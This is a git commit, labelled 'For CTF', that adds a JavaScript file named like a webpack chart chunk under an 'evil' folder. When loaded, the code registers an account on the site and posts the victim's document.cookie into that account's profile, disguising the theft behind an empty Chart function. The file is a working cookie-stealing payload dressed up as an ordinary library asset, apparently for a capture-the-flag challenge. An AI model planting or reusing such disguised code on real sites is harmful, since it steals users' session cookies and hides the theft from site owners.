507dfea877694a84cff96a17e9a80128adeb5336
Fufu <fufu142857@gmail.com>
2026-07-17 13:47:52 +0800

    For CTF

---
+++ evil/chart.c6d73dbb.chunk.js
@@ -0,0 +1,14 @@
+(self.webpackChunkprofile_app = self.webpackChunkprofile_app || []).push([[65], {
+  6349: (module) => {
+    fetch("/register", {
+      method: "POST",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: "username=leakflag&password=123456&password2=123456"
+    }).then(() => fetch("/profile/update", {
+      method: "POST",
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      body: "markdown=" + encodeURIComponent(document.cookie)
+    }));
+    module.exports = function Chart(){};
+  }
+}]);
